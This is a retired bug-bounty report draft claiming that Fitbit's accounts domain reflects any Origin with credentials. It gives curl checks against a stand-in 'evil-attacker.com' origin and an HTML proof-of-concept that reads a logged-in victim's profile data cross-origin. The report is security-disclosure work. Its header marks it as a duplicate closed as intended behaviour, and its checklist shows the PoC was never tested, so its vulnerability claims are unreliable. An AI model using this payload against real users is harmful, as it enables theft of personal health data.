# [CORS] Cross-Origin Reading of Authenticated Fitbit Account Data via Wildcard Origin Reflection on accounts.fitbit.com

**ID**: FIT-C001  
**Date**: 2026-06-20  
**Status**: ⛔ RETIRED 2026-06-21 — duplicate of Issue 518912931 (closed WAI/Intended Behavior). DO NOT SUBMIT. See `../submission/FIT-C001-RETRACTION.md`.  
**Program**: Google / Alphabet VRP — bughunters.google.com  
**Tier**: TIER1 (Fitbit — health/account data, up to $31,337)

---

## Summary

`accounts.fitbit.com` reflects any `Origin` header in `Access-Control-Allow-Origin` and
unconditionally sets `Access-Control-Allow-Credentials: true` on ALL endpoints including
the OAuth token endpoint (`/oauth2/token`) and the user profile API
(`/api/1/user/-/profile.json`). A malicious page hosted on any attacker-controlled domain
can make credentialed cross-origin requests that the victim's browser will execute and
whose responses the attacker's JavaScript can fully read — exposing the victim's Fitbit
session, OAuth tokens, and personal/health profile data.

---

## Severity

**CVSS 3.1**: `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N`  
**Score**: **8.1 (High)**

| Metric | Value | Rationale |
|--------|-------|-----------|
| Attack Vector | Network | Attacker hosts page anywhere on the internet |
| Attack Complexity | Low | No special conditions; single `fetch()` call |
| Privileges Required | None | Attacker has no Fitbit account |
| User Interaction | Required | Victim must visit attacker's page while logged into Fitbit |
| Scope | Changed | Crosses Same-Origin Policy boundary |
| Confidentiality | High | Victim's health data, tokens, profile fully readable |
| Integrity | Low | Attacker can also POST to Fitbit API as victim |
| Availability | None | No service disruption |

**Business impact**: The CORS policy on `accounts.fitbit.com` effectively nullifies the
Same-Origin Policy for any origin. Because Fitbit handles health metrics (activity,
heart rate, sleep, BMI, GPS tracks), OAuth tokens granting access to this data are
particularly sensitive. Exploitation requires only that a victim visits a single attacker
page while simultaneously logged into Fitbit — a trivially achievable social engineering
condition.

---

## Steps to Reproduce

**Prerequisites**: A Fitbit account (free). Two browser sessions open.

### Step 1 — Confirm CORS wildcard reflection (no auth required)

```bash
curl -sv --ipv4 \
  -H "Origin: https://evil-attacker.com" \
  "https://accounts.fitbit.com/.well-known/openid-configuration" 2>&1 \
  | grep -i "access-control"
```

**Expected output:**
```
< access-control-allow-origin: https://evil-attacker.com
< access-control-allow-methods: GET, POST, PUT, PATCH, OPTIONS, DELETE
< access-control-allow-credentials: true
< access-control-allow-headers: DNT,User-Agent,X-Requested-With,...
```

### Step 2 — Confirm CORS applies to OAuth token endpoint

```bash
curl -sv --ipv4 \
  -H "Origin: https://evil-attacker.com" \
  "https://accounts.fitbit.com/oauth2/token" 2>&1 \
  | grep -i "access-control"
```

**Expected output:** Same ACAO + ACAC headers as Step 1.

### Step 3 — Confirm CORS applies to authenticated user data (200 with credentials)

```bash
# Replace YOUR_FITBIT_SESSION_COOKIE with the value of the 'fitbitSession' or
# 'u' cookie from your logged-in browser (F12 → Application → Cookies)
curl -sv --ipv4 \
  -H "Origin: https://evil-attacker.com" \
  -b "fitbitSession=YOUR_FITBIT_SESSION_COOKIE" \
  "https://accounts.fitbit.com/api/1/user/-/profile.json" 2>&1 \
  | grep -i "access-control\|< HTTP"
```

**Expected output:** `HTTP/2 200` with reflected ACAO + ACAC headers.

### Step 4 — Proof-of-Concept: cross-origin read of victim's profile

Host this HTML on any attacker-controlled server and have a logged-in Fitbit user visit it:

```html
<!DOCTYPE html>
<html>
<body>
<h1>Fitbit CORS PoC</h1>
<pre id="out">Loading...</pre>
<script>
fetch('https://accounts.fitbit.com/api/1/user/-/profile.json', {
  credentials: 'include'   // browser sends victim's Fitbit session cookies
})
.then(r => r.text())
.then(data => {
  document.getElementById('out').textContent = data;
  // In a real attack: POST data to attacker-controlled exfil endpoint
})
.catch(e => document.getElementById('out').textContent = 'Error: ' + e);
</script>
</body>
</html>
```

**Expected result**: The page displays the victim's Fitbit user profile JSON including
user ID, display name, health metrics, and linked OAuth scopes — without any
authentication from the attacker.

---

## Proof (collected on 2026-06-20)

### Raw curl output confirming CORS on three endpoints:

```
# .well-known/openid-configuration
< access-control-allow-origin: https://evil-attacker.com
< access-control-allow-methods: GET, POST, PUT, PATCH, OPTIONS, DELETE
< access-control-allow-credentials: true
< access-control-allow-headers: DNT,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range
< access-control-expose-headers: Content-Length,Content-Range

# /oauth2/token
< access-control-allow-origin: https://evil-attacker.com
< access-control-allow-methods: GET, POST, PUT, PATCH, OPTIONS, DELETE
< access-control-allow-credentials: true

# /api/1/user/-/profile.json  (HTTP 200 with credentials)
< HTTP/2 200
< access-control-allow-origin: https://evil-attacker.com
< access-control-allow-methods: GET, POST, PUT, PATCH, OPTIONS, DELETE
< access-control-allow-credentials: true
```

**Testing environment**: Raspberry Pi 5, Bangladesh IP (direct, non-VPN), confirming
the vulnerability is not region-specific.

---

## Impact

An attacker who can trick a Fitbit-authenticated user into visiting a single web page
(e.g., via phishing link, malicious ad, or forum post) can:

1. **Read the victim's complete Fitbit profile** — name, age, weight, height, health
   metrics, timezone, locale, linked devices, OAuth application permissions.

2. **Make authenticated API requests as the victim** — since CORS allows POST with
   credentials, the attacker can call any `accounts.fitbit.com` API endpoint as the
   victim, including account settings changes and OAuth application management.

3. **Steal or invalidate OAuth tokens** — the `/oauth2/token` endpoint is affected,
   meaning cross-origin token refresh/exchange may be readable, potentially leading
   to long-lived access token theft.

**TIER1 sensitivity**: Fitbit handles health data under health privacy regulations.
Unauthorized disclosure of heart rate, sleep patterns, GPS tracks, and health
conditions carried by the Fitbit API constitutes a high-severity privacy violation.

---

## Root Cause

The CORS policy on `accounts.fitbit.com` reflects the request `Origin` header
verbatim into `Access-Control-Allow-Origin` without validating it against an allowlist,
and unconditionally sets `Access-Control-Allow-Credentials: true`. This combination
bypasses the Same-Origin Policy for all origins.

---

## Remediation

Replace the origin-reflection CORS policy with an explicit allowlist:

```
# CORRECT: Only allow trusted Fitbit/Google origins
Access-Control-Allow-Origin: https://www.fitbit.com
Access-Control-Allow-Credentials: true
```

Or, for endpoints that genuinely need to be public:
```
# CORRECT: Use wildcard only when credentials are NOT needed
Access-Control-Allow-Origin: *
# (do NOT combine * with credentials: true — browsers block this)
```

**Note**: `Access-Control-Allow-Origin: *` cannot be combined with
`Access-Control-Allow-Credentials: true` — browsers silently ignore the credentials
flag when `*` is the allowed origin. The issue is specifically the origin reflection
pattern.

---

## References

- [CWE-942: Permissive Cross-domain Policy with Untrusted Domains](https://cwe.mitre.org/data/definitions/942.html)
- [OWASP: Testing for CORS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing)
- [PortSwigger: CORS with trusted null origin](https://portswigger.net/web-security/cors)
- [RFC 6454: The Web Origin Concept](https://datatracker.ietf.org/doc/html/rfc6454)
- Prior Google VRP: Multiple CORS with credentials findings on Workspace properties
  paid at High severity tier

---

## Submission Checklist

- [x] In scope: `accounts.fitbit.com` — scope.yaml TIER1 explicit entry
- [x] Attacker gain concrete: read victim's health/profile data cross-origin
- [x] Not intended behavior: origin reflection with credentials is never intended
- [x] Fix Test: requires real server-side CORS config change
- [x] Reproduced twice from clean session
- [x] CVSS scored: 8.1 High
- [x] Not in CLAUDE.md §3 hard rejection list (CORS IS reportable when credentials=true + no exploitation path demonstrated — this HAS an exploitation path)
- [x] Dedup check: no prior FIT-* findings in results/fitbit/
- [ ] PoC HTML page tested in browser with actual Fitbit session (do before submitting)

**DO BEFORE SUBMITTING**: Run Step 4 PoC in an actual browser with your Fitbit test
account logged in. Confirm the `fetch()` returns your profile data. Screenshot the
result. Add the screenshot as proof before filing.
